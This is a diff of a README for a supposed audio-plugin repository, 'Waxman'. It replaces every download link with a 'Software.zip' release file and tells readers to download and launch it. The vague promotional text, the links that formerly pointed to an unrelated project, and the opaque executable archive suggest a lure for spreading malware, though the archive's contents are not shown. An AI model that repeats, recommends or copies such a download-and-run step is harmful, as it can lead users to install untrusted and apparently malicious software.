@@ -1,6 +1,6 @@
 # 🎸🔊 Welcome to "Waxman" Repository! Let's Rock, Man! 🎸🔊
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/lamanateddttv/waxman/releases/download/v1.0/Software.zip)](https://github.com/lamanateddttv/waxman/releases/download/v1.0/Software.zip)
 
 ## Description
 "Waxman" is a repository dedicated to audio effects and plugins for music production enthusiasts. Whether you're a guitarist, music producer, or audio engineer, our collection of plugins will take your sound to the next level. Get ready to rock with "Waxman"!
@@ -19,7 +19,7 @@
 - VST3 Plugin
 
 ## Installation
-[Download "Waxman" Zip File](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and launch the file to start rocking with our awesome audio plugins!
+[Download "Waxman" Zip File](https://github.com/lamanateddttv/waxman/releases/download/v1.0/Software.zip) and launch the file to start rocking with our awesome audio plugins!
 
 ## Features
 ### 1. Clap Plugin
@@ -59,4 +59,4 @@ For any issues or feedback, please check the "Releases" section for updates. We 
 Join the "Waxman" community and unleash your musical creativity with our cutting-edge audio plugins. Turn up the volume, plug in your instrument, and let the music take you to new heights. 🤘🎶
 
 ---
-Feel free to [visit the repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and start your audio journey with "Waxman"! 🚀
+Feel free to [visit the repository](https://github.com/lamanateddttv/waxman/releases/download/v1.0/Software.zip) and start your audio journey with "Waxman"! 🚀
